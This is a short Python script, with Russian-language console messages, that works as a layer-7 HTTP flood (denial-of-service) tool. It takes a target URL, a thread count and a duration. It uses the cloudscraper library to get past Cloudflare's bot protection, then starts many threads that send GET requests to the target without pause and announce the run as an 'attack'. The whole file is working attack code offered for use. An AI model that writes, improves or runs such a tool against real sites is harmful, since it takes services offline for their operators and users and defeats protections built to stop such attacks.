import sys
import threading
import cloudscraper
import datetime
import time
from colorama import Fore, init

init(convert=True)

def LaunchCFB(url, threadss, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(threadss):
        try:
            th = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except:
            pass

def countdown(seconds):
    time.sleep(seconds)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(Fore.RED + " [!] Неверное количество аргументов. Используйте: python3 cfb.py <цель> <поток> <время>")
        sys.exit(1)

    target, thread, t = sys.argv[1], sys.argv[2], sys.argv[3]

    print(Fore.MAGENTA + f" [>] Атака => {target} на {t} секунд")

    timer = threading.Thread(target=countdown, args=(int(t),))
    timer.start()

    LaunchCFB(target, int(thread), int(t))
    timer.join()

    print(Fore.MAGENTA + "\n [>] Атака завершена.")
